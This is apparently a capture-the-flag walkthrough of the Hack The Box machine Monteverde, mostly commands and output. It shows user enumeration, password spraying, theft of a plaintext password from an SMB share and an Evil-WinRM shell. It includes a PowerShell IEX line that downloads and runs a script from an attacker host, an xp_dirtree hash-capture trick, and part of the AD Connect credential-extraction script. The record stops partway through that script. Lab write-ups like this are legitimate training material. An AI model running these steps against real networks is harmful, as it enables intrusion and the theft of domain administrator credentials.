@@ -1,0 +1,576 @@
+Monteverde - Hack The Box - Windows Medium Azure Exploit
+
+Active Directory with service AD connect on it, allows password sycnhronized with on premise AD and azure 365. Same password for
+both. Replication on both. Issue come when it needs to store the password somewhere. Stored in mssql database. It has to be 
+decrypted. Can actually use the actual AD connect service.
+
+We have dns on port 53, kerberos on 88, msrpc 135 and 445. Encrypted ldap most likely a DC.
+
+Will attack smb and LDAP. Will try dns queries first.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+└──╼ $nslookup
+> server 10.10.10.172
+Default server: 10.10.10.172
+Address: 10.10.10.172#53
+> 127.0.0.1
+1.0.0.127.in-addr.arpa	name = localhost.
+> 10.10.10.172
+** server can't find 172.10.10.10.in-addr.arpa: SERVFAIL
+> megabank.local
+Server:		10.10.10.172
+Address:	10.10.10.172#53
+
+Name:	megabank.local
+Address: 10.10.10.172
+Name:	megabank.local
+Address: 10.10.10.30
+===================================================================================================================================
+
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/monteverde/nmap]
+└──╼ $rpcclient -U '' 10.10.10.172 -N
+rpcclient $> 
+rpcclient $> enumdomusers
+user:[Guest] rid:[0x1f5]
+user:[AAD_987d7f2f57d2] rid:[0x450]
+user:[mhope] rid:[0x641]
+user:[SABatchJobs] rid:[0xa2a]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[svc-netapp] rid:[0xa2d]
+user:[dgalanos] rid:[0xa35]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+
+rpcclient $> querydispinfo
+index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
+index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
+index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
+index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
+index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
+index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
+index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
+index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
+
+===================================================================================================================================
+
+We will want to build a wordlist around all the users found.
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $cat users.lst 
+Guest
+AAD_987d7f2f57d2
+mhope
+SABatchJobs
+svc-ata
+svc-bexec
+svc-netapp
+dgalanos
+roleary
+smorgan
+===================================================================================================================================
+
+One of the interesting things is AAD_987d users, this a is an active directory AD sync to sync passwords between azure and the dc
+We can also try and take a look at the password policy if available. We see that the account lockout threshold is none.
+There is a chance that they are loggin bruteforce so don't try hastily.
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $crackmapexec smb 10.10.10.172 --pass-pol
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.172    445    MONTEVERDE       [+] Dumping password info for domain: MEGABANK
+SMB         10.10.10.172    445    MONTEVERDE       Minimum password length: 7
+SMB         10.10.10.172    445    MONTEVERDE       Password history length: 24
+SMB         10.10.10.172    445    MONTEVERDE       Maximum password age: 41 days 23 hours 53 minutes 
+SMB         10.10.10.172    445    MONTEVERDE       
+SMB         10.10.10.172    445    MONTEVERDE       Password Complexity Flags: 000000
+SMB         10.10.10.172    445    MONTEVERDE       	Domain Refuse Password Change: 0
+SMB         10.10.10.172    445    MONTEVERDE       	Domain Password Store Cleartext: 0
+SMB         10.10.10.172    445    MONTEVERDE       	Domain Password Lockout Admins: 0
+SMB         10.10.10.172    445    MONTEVERDE       	Domain Password No Clear Change: 0
+SMB         10.10.10.172    445    MONTEVERDE       	Domain Password No Anon Change: 0
+SMB         10.10.10.172    445    MONTEVERDE       	Domain Password Complex: 0
+SMB         10.10.10.172    445    MONTEVERDE       
+SMB         10.10.10.172    445    MONTEVERDE       Minimum password age: 1 day 4 minutes 
+SMB         10.10.10.172    445    MONTEVERDE       Reset Account Lockout Counter: 30 minutes 
+SMB         10.10.10.172    445    MONTEVERDE       Locked Account Duration: 30 minutes 
+SMB         10.10.10.172    445    MONTEVERDE       Account Lockout Threshold: None
+SMB         10.10.10.172    445    MONTEVERDE       Forced Log off Time: Not Set
+===================================================================================================================================
+
+We create a passwordlist from the users and use hashcat to mutate it and get an enhanced version.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $hashcat --force --stdout -r /usr/share/hashcat/rules/best64.rule passwords.lst > password.lst
+┌─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $crackmapexec smb 10.10.10.172 -u users.lst -p password.lst 
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:tseuG STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:GUEST STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest0 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest3 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest4 STATUS_LOGON_FAILURE 
+===================================================================================================================================
+
+We will try a basic one using the users list for the password list
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $crackmapexec smb 10.10.10.172 -u users.lst -p users.lst 
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+
+===================================================================================================================================
+
+And we get a hit for the user SABatchJobs:SABatchJobs We could try evil-winrm.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $crackmapexec winrm 10.10.10.172 -u SABatchJobs -p SABatchJobs
+WINRM       10.10.10.172    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
+WINRM       10.10.10.172    5985   MONTEVERDE       [*] http://10.10.10.172:5985/wsman
+WINRM       10.10.10.172    5985   MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
+===================================================================================================================================
+
+Unfortunately we can not log in. We can try share enumeration. Using smbmap.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $smbclient -U '' -L //10.10.10.172 -N
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+┌─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172
+[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	azure_uploads                                     	READ ONLY	
+	C$                                                	NO ACCESS	Default share
+	E$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+	users$                                            	READ ONLY	
+===================================================================================================================================
+
+We can try and mount each share into our desktop.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 -R --exclude SYSVOL
+[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	azure_uploads                                     	READ ONLY	
+	.\azure_uploads\*
+	dr--r--r--                0 Fri Jan  3 04:43:36 2020	.
+	dr--r--r--                0 Fri Jan  3 04:43:36 2020	..
+	C$                                                	NO ACCESS	Default share
+	E$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	.\IPC$\*
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	InitShutdown
+	fr--r--r--                6 Sun Dec 31 16:07:02 1600	lsass
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	ntsvcs
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	scerpc
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	Winsock2\CatalogChangeListener-39c-0
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	epmapper
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	Winsock2\CatalogChangeListener-1ec-0
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	LSM_API_service
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	eventlog
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	Winsock2\CatalogChangeListener-490-0
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	atsvc
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	Winsock2\CatalogChangeListener-628-0
+	fr--r--r--                4 Sun Dec 31 16:07:02 1600	wkssvc
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	Winsock2\CatalogChangeListener-28c-0
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	Winsock2\CatalogChangeListener-28c-1
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	RpcProxy\49673
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	3bf28f658cefc420
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	RpcProxy\593
+	fr--r--r--                4 Sun Dec 31 16:07:02 1600	srvsvc
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	spoolss
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	Winsock2\CatalogChangeListener-b90-0
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	netdfs
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	vgauth-service
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	Winsock2\CatalogChangeListener-27c-0
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	SQLLocal\MSSQLSERVER
+	fr--r--r--                2 Sun Dec 31 16:07:02 1600	sql\query
+	fr--r--r--                3 Sun Dec 31 16:07:02 1600	W32TIME_ALT
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	Winsock2\CatalogChangeListener-838-0
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	CPFATP_6108_v4.0.30319
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	PSHost.132629860407973594.6108.DefaultAppDomain.miiserver
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	GoogleCrashServices\S-1-5-18
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	GoogleCrashServices\S-1-5-18-x64
+	fr--r--r--                1 Sun Dec 31 16:07:02 1600	Winsock2\CatalogChangeListener-bf4-0
+	NETLOGON                                          	READ ONLY	Logon server share 
+	.\NETLOGON\*
+	dr--r--r--                0 Thu Jan  2 14:05:27 2020	.
+	dr--r--r--                0 Thu Jan  2 14:05:27 2020	..
+	users$                                            	READ ONLY	
+	.\users$\*
+	dr--r--r--                0 Fri Jan  3 05:12:48 2020	.
+	dr--r--r--                0 Fri Jan  3 05:12:48 2020	..
+	dr--r--r--                0 Fri Jan  3 05:15:23 2020	dgalanos
+	dr--r--r--                0 Fri Jan  3 05:41:18 2020	mhope
+	dr--r--r--                0 Fri Jan  3 05:14:56 2020	roleary
+	dr--r--r--                0 Fri Jan  3 05:14:28 2020	smorgan
+	.\users$\mhope\*
+	dr--r--r--                0 Fri Jan  3 05:41:18 2020	.
+	dr--r--r--                0 Fri Jan  3 05:41:18 2020	..
+	fw--w--w--             1212 Fri Jan  3 06:59:24 2020	azure.xml
+===================================================================================================================================
+
+Looks like the user mhope has a file and it's azure related. We use smbmap to download it.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172 --download users$/mhope/azure.xml
+[+] Starting download: users$\mhope\azure.xml (1212 bytes)
+[+] File output to: /home/user/htb/monteverde/10.10.10.172-users_mhope_azure.xml
+===================================================================================================================================
+
+And we find a plain text password.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $cat 10.10.10.172-users_mhope_azure.xml 
+��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
+    <Props>
+      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
+      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
+      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
+      <S N="Password">4n0therD4y@n0th3r$</S>
+    </Props>
+  </Obj>
+</Objs>┌─[user@parrot-virtual]─[~/htb/monteverde]
+===================================================================================================================================
+
+We wil use "4n0therD4y@n0th3r$" against the rest of the users with crackmap.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $crackmapexec  smb 10.10.10.172 -u users.lst -p "4n0therD4y@n0th3r$"
+SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE 
+SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ 
+===================================================================================================================================
+
+We don't have the pwn output but we will try winrm again to check.
+COMMANDS and OUTPUT:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$"
+
+Evil-WinRM shell v2.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\mhope\Documents> hostname
+MONTEVERDE
+*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
+megabank\mhope
+*Evil-WinRM* PS C:\Users\mhope\Documents> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 10.10.10.172
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+===================================================================================================================================
+
+Enumerate for a privilege escalation. We download seatbelt from the sharp collections repo.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+*Evil-WinRM* PS C:\Users\mhope\Documents> curl  10.10.14.23:8000/Seatbelt.exe -o seatbelt.exe
+===================================================================================================================================
+
+We don't really find much from seatbelt and winPEAS
+COMMANDS and OUTPUT:
+===================================================================================================================================
+*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name      SID
+============== ============================================
+megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+===================================================================================================================================
+
+Looking at th whoami we see that mhope is part of the azure admins group. We try to look at sqlcmd
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -L
+
+Servers:
+    ;UID:Login ID=?;PWD:Password=?;Trusted_Connection:Use Integrated Security=?;*APP:AppName=?;*WSID:WorkStation ID=?;
+===================================================================================================================================
+
+We can now start querying data from the sql database
+COMMANDS and OUTPUT:
+===================================================================================================================================
+*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -Q "select name,create_date from sys.databases"
+name                                                                                                                             create_date
+-------------------------------------------------------------------------------------------------------------------------------- -----------------------
+master                                                                                                                           2003-04-08 09:13:36.390
+tempdb                                                                                                                           2021-04-15 11:45:27.507
+model                                                                                                                            2003-04-08 09:13:36.390
+msdb                                                                                                                             2017-08-22 19:39:22.887
+ADSync                                                                                                                           2020-01-02 14:53:29.783
+
+(5 rows affected)
+
+===================================================================================================================================
+
+If you did not know how to query things a powershell script such as powerup could help with the process.
+COMMANDS and OUTPUT:
+===================================================================================================================================
+IEX(New-Object Net.WebClient).downloadString("http://10.10.14.23:8000/PowerUpSQL.ps1")
+*Evil-WinRM* PS C:\Users\mhope\Documents> Invoke-SQLAudit -Verbose
+*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -Q "xp_dirtree '\\10.10.14.23\test'"
+subdirectory                                                                                                                                                                                                                                                         depth
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -----------
+
+(0 rows affected)
+===================================================================================================================================
+
+We run responder inconjucntion with the sql xp_dirtree command and get a hash back
+COMMANDS and OUTPUT:
+===================================================================================================================================
+MONTEVERDE$::MEGABANK:1122334455667788:42036D1FBABF30EF7BC1CF61795988B6:0101000000000000C0653150DE09D2016A52D7258530070B000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000067BF4F3D84D4D414F00E43CD2C2A56A1A8961C0132606292D90743EC0E055EAD0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
+
+┌─[user@parrot-virtual]─[~/htb/monteverde]
+└──╼ $hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+===================================================================================================================================
+
+Unable to crack the ntlmv2 hash so we move on. We search for AD azure privilege escalation.
+"https://blog.xpnsec.com/azuread-connect-for-redteam/"
+Essentially what its saying is azure AD connect is a tool to sync password between azure 365 and on premises AD.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -Q "use ADSync; select private_configuration_xml,encrypted_configuration from mms_managem
+ent_agent"
+Changed database context to 'ADSync'.
+private_configuration_xml                                                                                                                                                                                                                                        encrypted_configuration
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<MAConfig>
+      <primary_class_mappings>
+        <mapping>
+          <primary_class>contact</primary_class>
+          <oc-value>contact</oc-value>
+        </mapping>
+        <mapping>
+          <primary_class>device</primary_class>
+          <oc-v 8AAAAAgAAACfn4Lemwuy/a+hBmbvJMeKVf/3ScxlxjHq9eM7Gjy2YLrrsqeRUZh51ks9Dt6BFTSd8OdCHG209rYsFX6f5Az4ZdpscNYSncIaEaI4Re4qw4vNPSIb3DXX6FDtfQHF97fVDV6wp4e3XTni1Y/DEATO+fgJuveCSDf+lX0UNnQEGrTfdDY9sK5neJ5vquLr0pdobAI6vU2g55IrwahGfKmwFjWF5q+qJ3zGR1nfxgsc0xRUNY2xWKoz
+<adma-configuration>
+ <forest-name>MEGABANK.LOCAL</forest-name>
+ <forest-port>0</forest-port>
+ <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
+ <forest-login-user>administrator</forest-login-user>
+ <forest-login-domain>MEGABANK.LOCAL 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g
+
+(2 rows affected)
+
+===================================================================================================================================
+
+We get an encrypted password, what we do is go over the AD sync blog and we find the script that does the privesc so that we in 
+return get the results of the administator and the clear text password if possible.
+
+COMMANDS and OUTPUT:
+===================================================================================================================================
+Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=localhost;Integrated Security=true;Initial Catalog=ADSync"
+$client.Open()
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
+
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
+
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
